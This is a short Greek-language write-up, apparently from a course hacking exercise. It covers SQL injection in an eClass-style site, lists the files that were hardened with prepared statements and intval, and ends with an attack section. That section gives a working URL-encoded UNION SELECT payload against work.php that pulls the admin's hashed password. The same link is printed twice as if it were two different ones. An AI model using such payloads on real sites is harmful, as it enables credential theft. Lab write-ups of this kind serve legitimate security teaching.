# SQL Injections 

Δεν βρέθηκαν πολλά σημεία για SQL Injections στο site. Οι προγραμματισμές που το δημιούργισαν χρησιμοποίησαν τεχνικές έτσι ώστε να αποφήγουν είσοδο από τον χρήστη στα SQL Queries, ενώ σε σημεία που δεν μπορεί να αποφευχθεί υπάρχουν συναρτήσεις που καθορίζουν την μορφή των μεταβλητών πριν περάσουν απο τα queries. Τα προβλήματα παρατηρήθηκαν σε σημεία που η SQL δέχεται είσοδο προσβάσιμη από τον χρήστη μέσω μεταβλητών που ορίζονται στα link.

## Defence

Για την ασφάλεια του site επιλέχθηκε η τεχνική των prepared statements σε queries που η είσοδος μπόρει να καθοριστεί από κάποιον κακόβουλο χρήστη και δεν αφαιρέθηκαν. Τα αρχεία στα οποία βρίσκονται αυτά τα queries είναι:
 - modules/auth/opencourses.php
 - modules/auth/newuser.php
 - modules/auth/listfaculte.php
 - modules/work/work.php

Ενώ στο αρχείο modules/phpbb/viewtopic.php ασφαλίστηκε με την χρήση της συνάρτησης intval.

## Attack

Τα αξιοσημείωτα sql injections που βρέθηκαν έχουν σαν στόχο την εμφάνιση του κρυπτογραφιμένου κωδικού του admin. Για να εκτελεστούν αρκούν τα παρακάτω:

Αν είμαστε στην σελίδα κάποιου μαθήματος με το link 
http://hack-n-roll.csec.chatzi.org/modules/work/work.php?id=%27%20AND%200=1%20UNION%20SELECT%20password%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--
κάτω στην σελίδα που εμφανίζετε υπάρχει ο κωδικός

Ενώ με το link http://hack-n-roll.csec.chatzi.org/modules/work/work.php?id=%27%20AND%200=1%20UNION%20SELECT%20password%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--
εμφανίζετε ο κωδικός.